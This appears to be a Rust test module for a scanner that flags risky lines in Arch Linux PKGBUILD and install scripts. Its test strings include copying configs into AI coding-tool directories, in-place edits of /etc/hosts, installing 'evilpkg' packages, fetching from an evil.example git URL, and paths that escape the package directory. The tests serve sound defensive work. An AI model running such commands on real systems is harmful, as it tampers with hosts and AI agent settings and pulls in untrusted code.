        for s in [
            "cp settings.json ~/.claude/",
            "cp -r cfg /home/u/.cursor",
            "install -Dm644 -t /root/.codex config.toml",
            "mv hooks.json /home/u/.gemini/",
        ] {
            assert!(
                fires("PERSIST-008", s, FileType::InstallScript),
                "missed: {s}"
            );
        }
        assert!(!fires(
            "PERSIST-008",
            "cp ~/.claude/settings.json /tmp/bak/",
            FileType::InstallScript
        ));
        assert!(!fires(
            "PERSIST-008",
            "cp cfg \"$pkgdir/etc/skel/.claude/\"",
            FileType::InstallScript
        ));
    }

    #[test]
    fn sed_script_text_is_not_an_in_place_flag() {
        assert!(!fires(
            "TAMPER-018",
            "sed 's/foo-bin/x/' /etc/hosts > out",
            FileType::InstallScript
        ));
        assert!(!fires(
            "TAMPER-018",
            "sed -n '/x-in/p' /etc/hosts",
            FileType::InstallScript
        ));
        assert!(fires(
            "TAMPER-018",
            "sed -i 's/a/b/' /etc/hosts",
            FileType::InstallScript
        ));
        assert!(fires(
            "TAMPER-018",
            "sed -ni 's/a/b/p' /etc/hosts",
            FileType::InstallScript
        ));
        assert!(fires(
            "TAMPER-018",
            "sed --in-place 's/a/b/' /etc/hosts",
            FileType::InstallScript
        ));
        assert!(fires(
            "TAMPER-018",
            "sed -e 's/a/b/' -i /etc/hosts",
            FileType::InstallScript
        ));
    }

    #[test]
    fn npm_command_positions() {
        for s in [
            "    npm install evil-helper-pkg",
            "cd app && npm install evil-helper-pkg",
            "if true; then npm install evilpkg; fi",
            "_x=$(npm install evilpkg)",
            "_y=`npm install evilpkg`",
            "( npm install evilpkg )",
            "(npm install evilpkg)",
            "! npm install evilpkg",
            "/usr/bin/npm install evilpkg",
            "\"npm\" install evilpkg",
            "npm install -- evilpkg",
            "xargs npm install <<< evilpkg",
            "echo evilpkg | xargs -n1 npm i",
            "npx -y evilpkg",
            "npx --yes evilpkg",
            "npx -p evilpkg some-bin",
            "pnpm dlx evilpkg",
            "yarn dlx evilpkg",
            "sudo npm install -g evilpkg",
        ] {
            assert!(fires("ATOMIC-005", s, FileType::Pkgbuild), "missed: {s}");
        }
        assert!(fires(
            "ATOMIC-006",
            "_x=$(npm install git+https://evil.example/x.git)",
            FileType::Pkgbuild
        ));
        assert!(fires(
            "ATOMIC-006",
            "( /usr/bin/npm install -- git+https://evil.example/y.git )",
            FileType::Pkgbuild
        ));
        for s in [
            "npm install",
            "npm ci --no-audit",
            "npm install --cache \"$srcdir/npm-cache\" --no-audit",
            "npm install --omit dev",
            "pnpm install --filter web --frozen-lockfile",
            "npm run build -- --mode production",
            "npm install --userconfig \"$srcdir/npmrc\"",
            "yarn install --modules-folder node_modules --frozen-lockfile",
            "npm install -w packages/app",
            "npm install --loglevel=error --prefer-offline",
            "optdepends=('foo: install with npm i -g foo-cli')",
            "'claude-code: optional CLI (npm i -g @anthropic-ai/claude-code)'",
            "echo \"run npm install -g foo yourself\"",
        ] {
            let m = ids(s, FileType::Pkgbuild);
            assert!(
                !m.iter().any(|x| x == "ATOMIC-005" || x == "ATOMIC-006"),
                "false positive: {s}: {m:?}"
            );
        }
    }

    #[test]
    fn paths_leaving_the_package_directory() {
        for s in [
            ". \"$startdir/../other/PKGBUILD\"",
            "bash $startdir/../x.sh",
            "source ${startdir}/../lib.sh",
            "cat \"$startdir\"/../x",
            "cd \"$startdir/..\"",
            "cd $startdir/..; ls",
            "cp -r \"$srcdir/../../sibling\" .",
            "bash \"${srcdir}/../../x.sh\"",
            "ls \"$srcdir/..\"/..",
            "source \"$BUILDDIR/../x\"",
            "sh ${BUILDDIR}/../x.sh",
        ] {
            assert!(fires("SRC-011", s, FileType::Pkgbuild), "missed: {s}");
            assert!(
                fires("SRC-011", s, FileType::InstallScript),
                "missed (install): {s}"
            );
        }
        for s in [
            "cd \"$srcdir/..\"",
            "cp x \"$srcdir/../y\"",
            "ls \"$pkgdir/..\"",
            "install -Dm644 x \"$pkgdir/../x\"",
            "cd \"$startdir\"",
            "cp \"$startdir/src/file\" .",
            "cd \"$srcdir/foo/..\"",
            "x=\"$startdir/..foo\"",
            "echo \"$startdir/...\"",
        ] {
            assert!(
                !fires("SRC-011", s, FileType::Pkgbuild),
                "false positive: {s}"
            );
        }
    }
}
